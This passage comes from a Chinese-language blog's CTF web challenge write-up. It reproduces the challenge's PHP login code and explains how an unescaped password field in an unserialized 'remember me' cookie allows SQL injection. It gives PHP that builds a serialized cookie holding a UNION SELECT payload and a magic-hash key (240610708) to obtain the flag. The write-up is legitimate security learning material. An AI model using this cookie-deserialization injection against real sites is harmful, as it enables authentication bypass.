class="line">    $result = $conn-&gt;query($sql);</span><br><span class="line">    <span class="keyword">if</span>($row = $result-&gt;fetch_assoc())</span><br><span class="line">    &#123;</span><br><span class="line">        $user = <span class="keyword">new</span> User($row[<span class="string">'id'</span>],$row[<span class="string">'username'</span>],$row[<span class="string">'pass'</span>],$row[<span class="string">'userkey'</span>]);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'remember'</span>]))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(!setcookie(<span class="string">"user"</span>,serialize($user)))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"&lt;div class='alert alert-warning' style='font-size:20px;'&gt;You will need to activate cookies on your browser for this task!&lt;/div&gt;"</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> </span><br><span class="line">            setcookie(<span class="string">"user"</span>,<span class="string">""</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(md5($user-&gt;key)==<span class="string">'0e192156527884742253757578831994'</span>)</span><br><span class="line">            $msg= <span class="string">"&lt;div class='alert alert-success' style='font-size:20px;'&gt;$FLAG&lt;/div&gt;"</span>;</span><br><span class="line">        <span class="keyword">else</span> $msg= <span class="string">"&lt;div class='alert alert-warning' style='font-size:20px;'&gt;Valid credentials but you don't have the right key, sorry!&lt;/div&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">else</span> $msg= <span class="string">"&lt;div class='alert alert-danger' style='font-size:20px;'&gt;Login failed&lt;/div&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;title&gt;Login page&lt;/title&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- Bootstrap core CSS --&gt;</span><br><span class="line">    &lt;link href=<span class="string">"css/app.css"</span> rel=<span class="string">"stylesheet"</span>&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line"></span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;nav class="navbar navbar-inverse navbar-fixed-top"&gt;</span><br><span class="line">      &lt;div class="container"&gt;</span><br><span class="line">        &lt;div class="navbar-header"&gt;</span><br><span class="line">          &lt;a class="navbar-brand" href="#"&gt;&lt;img style="height: 100%; margin-top: -3px; margin-right: 5px;" src="img/logo.png"&gt;WEB 5  &lt;/a&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">        &lt;div id="navbar" class="collapse navbar-collapse"&gt;</span><br><span class="line"></span><br><span class="line">        &lt;/div&gt;&lt;!--/.nav-collapse --&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">    &lt;/nav&gt;</span><br><span class="line"></span><br><span class="line">    &lt;div class="container"&gt;</span><br><span class="line">&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">        <span class="keyword">echo</span> $msg;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line">    &lt;h1&gt; Login &lt;/h1&gt;</span><br><span class="line">         &lt;div class="container" &gt;</span><br><span class="line">    &lt;div class="col-md-6" &gt;</span><br><span class="line">        &lt;div id=<span class="string">"logbox"</span> &gt;</span><br><span class="line">        &lt;form name="login" class=" navbar-center" action="" method="post"&gt;</span><br><span class="line">        &lt;div class="input-group"&gt;</span><br><span class="line">            &lt;input type="text" name="username" class="form-control" placeholder="User Name"/&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">            &lt;input type="password" name="password" class="form-control" placeholder="Password"/&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">            &lt;input type=<span class="string">"checkbox"</span> name=<span class="string">"remember"</span> /&gt; &lt;b&gt;Remember me.&lt;/b&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">            &lt;br&gt; &lt;br&gt;</span><br><span class="line">            &lt;div class="input-group"&gt;</span><br><span class="line">            &lt;input type="submit" class="btn btn-primary" value="login"/&gt;</span><br><span class="line">            &lt;input type="reset" class="btn btn-primary" value="Cancel"/&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">        &lt;/form&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<p>分析下可以得到 flag 获取的条件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">能够查询到登录用户</span><br><span class="line">用户的 key 值 == &apos;0e192156527884742253757578831994&apos;</span><br></pre></td></tr></table></figure>
+<p>0e 开头的其他部分全为数字的 md5 值我们应该很熟悉了，猜测应该是联合查询 union select 一个用户，使得其 md5 值相等就可以了。然后看下登录部分，可以看到有两种方式可以登录，第一种是通过用户名和密码，但是用户名经过了 mysqli_real_escape_string 函数，密码又被 md5 了，不存在注入，第二种方式是通过 cookie，然后反序列化来登录，我们可以看到反序列化出来的用户名和密码是没有经过任何处理的，所以这里存在注入<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $id;</span><br><span class="line">    <span class="keyword">public</span> $name;</span><br><span class="line">    <span class="keyword">public</span> $pass;</span><br><span class="line">    <span class="keyword">public</span> $key;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($id,$uname,$pass,$key)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;id=htmlspecialchars($id);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name=htmlspecialchars($uname);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;pass=htmlspecialchars($pass);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;key=htmlspecialchars($key);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line">$user = <span class="keyword">new</span> User(<span class="string">'1'</span>, <span class="string">'a5s4d54'</span>, <span class="string">"use' union select 1,'user1','user1','240610708'#"</span>, <span class="string">'240610708'</span>);</span><br><span class="line"><span class="keyword">echo</span> urlencode((serialize($user)));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>把输出的值放在 cookie 里就可以了<br>中间遇到一个坑，因为是否输入用户名是通过 isset 函数来检测的，当你提交过一次的时候再刷新，虽然没有输入任何数据，但是在请求主体中是以空字符串提交的，这种情况下 isset 会判断为真(我一般都用 isset 和 empty 共同验证)，不使用 cookie，造成了起初修改 cookie 一直不成功</p>
+
+  </section>
+
+  
+  
+</article>
+
+
+            <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+<footer class="footer">
+    <span id="busuanzi_container_page_pv">
+      本文总阅读量<span id="busuanzi_value_page_pv"></span>次
+    </span>
+<span id="busuanzi_container_site_uv">
+  本站访客数<span id="busuanzi_value_site_uv"></span>人次
+</span>
+    <span class="footer__copyright">&copy; 2016-2017. | 由<a href="https://hexo.io/">Hexo</a>强力驱动 | 主题<a href="https://github.com/someus/huno">Huno</a> | <a href="https://coding.net/u/HeartSky/p/HeartSky/git/pages">Hosted by Coding Pages</a></span>  
+</footer>
+
+        </div>
+    </div>
+
+    <!-- js files -->
+    <script src="/js/jquery.min.js"></script>
+    <script src="/js/main.js"></script>
+    <script src="/js/scale.fix.js"></script>
+    
+
+    
+
+    <script type="text/javascript" src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    <script type="text/javascript"> 
+        $(document).ready(function(){
+            MathJax.Hub.Config({ 
+                tex2jax: {inlineMath: [['$','$'],['[latex]','[/latex]'], ['\\(','\\)']]} 
+            });
+        });
+    </script>
+
+
+
+    
+
+    <script src="/js/awesome-toc.min.js"></script>
+    <script>
+        $(document).ready(function(){
+            $.awesome_toc({
+                overlay: true,
+                contentId: "post-content",
+            });
+        });
+    </script>
+
+
+    <script src="http://s11.cnzz.com/z_stat.php?id=1259147269&web_id=1259147269" language="JavaScript"></script>
+    
+    <!--kill ie6 -->
+<!--[if IE 6]>
+  <script src="//letskillie6.googlecode.com/svn/trunk/2/zh_CN.js"></script>
+<![endif]-->
+
+</body>
+</html>
